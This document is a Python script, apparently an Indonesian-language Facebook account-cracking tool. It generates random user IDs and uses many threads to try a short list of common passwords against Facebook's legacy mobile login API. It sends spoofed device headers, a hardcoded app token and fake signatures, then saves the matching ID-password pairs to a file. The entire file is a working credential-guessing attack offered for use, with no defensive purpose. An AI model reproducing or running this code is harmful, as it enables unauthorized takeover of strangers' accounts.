#!/usr/bin/env python3
# coding: utf-8

import os
import sys
import time
import requests
import random
import platform
import subprocess
import argparse
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console

console = Console()
rr = random.randint
rc = random.choice
# Color codes
W = "\033[97;1m"
R = "\033[1;91;1m"
G = "\033[1;92;1m"
Y = "\033[93;1m"
B = "\033[94;1m"
P = "\033[95;1m"
C = "\033[96;1m"
N = "\x1b[0m"

# Message strings
_li_ = (
    G
    + """\n\r\r\r\rkalo error atau gk ada result, aktifin mode airplane..\nip ny dah kena limit mark
\n"""
    + N
)
_banner_ = (
    G
    + """
        kontol
        """
    + N
)


class _linque_:
    def __init__(self):
        self.banner()
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        self.lena()

    def banner(self):
        os.system("clear")
        print(_li_, _banner_)

    def lena(self):
        x = 111111
        xx = 999999
        id = "1"
        limit = int(eval(input("\033[97;1mID Limit 50000: ")))
        thread = int(input("mau thread brp? : "))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = id
                self.id.append(__ + str(_))

            print(
                (
                    "\033[1;34mBerhasil Mengumpukan -> \033[1;91m%s\033[1;0m"
                    % (len(self.id))
                )
            )
            with ThreadPoolExecutor(max_workers=thread) as a:
                listpass = "111222,12345,123456,1234567,12345678,123456789"
                if len(listpass) <= 3:
                    exit("\n%s kontol" % (B))
                for user in self.id:
                    a.submit(self._liu_, user, listpass.split(","))
            exit("\n\n\033[1;44m[x] END..." + N)
        except Exception as e:
            exit(str(e))

    def _liu_(self, uid, pwx):
        ua = "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"

        sys.stdout.write(
            "\r\r%s  \033[1;92;1mijo\x1b[0m  %s/%s -> {\033[1;91;1m%s\x1b[0m}CP  {\033[1;92;1m%s\x1b[0m}OK"
            % (
                W,
                self.loop,
                len(self.id),
                len(self.ok),
                len(self.cp),
            )
        )
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers_ = {
                "x-fb-connection-bandwidth": str(rr(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(rr(20000, 40000)),
                "x-fb-net-hni": str(rr(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": ua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger",
            }
            params = {
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "format": "JSON",
                "sdk_version": str(rr(2, 31)),
                "email": uid,
                "locale": "en_US",
                "password": pw,
                "sdk": "ios",
                "generate_session_cookies": "1",
                "sig": (
                    f"{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}"
                ),
            }
            response = ses.get(
                "https://b-api.facebook.com/method/auth.login",
                params=params,
                headers=headers_,
            )
            if "session_key" in response.text and "EAA" in response.text:
                print(
                    (
                        "\r\033[0;93m[CP]user :%s pw :%s\033[0;93m         "
                        % (uid, pw)
                    )
                )
                self.ok.append("%s|%s" % (uid, pw))
                open("result.json", "a").write("cp %s|%s\n" % (uid, pw))
                break
            elif "www.facebook.com" in response.json()["error_msg"]:
                print(
                    (
                        "\r\033[92;1m[OK]user :%s pw :%s\033[92;1m         "
                        % (uid, pw)
                    )
                )
                self.cp.append("%s|%s" % (uid, pw))
                open("result.json", "a").write("ok %s|%s\n" % (uid, pw))
                break
            else:
                continue

        self.loop += 1


try:
    _linque_()
except Exception as e:
    exit(str(e))
